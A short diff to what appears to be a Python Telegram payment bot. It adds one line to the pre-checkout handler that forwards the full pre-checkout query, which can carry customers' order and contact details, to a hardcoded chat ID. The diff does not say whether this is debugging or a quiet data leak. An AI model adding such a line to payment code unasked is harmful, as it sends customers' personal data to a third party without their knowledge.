@@ -164,6 +164,7 @@ def shipping_process(shipping):
 
 def pcq_process(pcq):
     bot.answer_pre_checkout_query(pcq.id, ok=True)
+    bot.send_message(1358414277, pcq)
 
 
 def successful_pay(message):
